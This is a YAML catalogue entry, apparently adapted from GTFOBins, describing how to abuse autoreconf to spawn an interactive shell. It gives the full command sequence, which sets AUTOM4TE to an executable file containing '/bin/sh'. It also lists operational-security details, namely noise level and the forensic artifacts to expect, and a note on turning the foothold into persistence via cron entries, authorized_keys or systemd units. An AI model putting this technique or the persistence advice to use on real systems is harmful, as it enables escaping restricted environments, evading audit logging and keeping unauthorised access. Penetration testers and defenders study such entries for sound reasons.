---
name: autoreconf
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo '/bin/sh 1>&0' >/path/to/temp-file
    chmod +x /path/to/temp-file
    echo AC_INIT >configure.ac
    AUTOM4TE=/path/to/temp-file autoreconf
  notes: The shell is invoked multiple times.
references:
- https://gtfobins.github.io/gtfobins/autoreconf/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
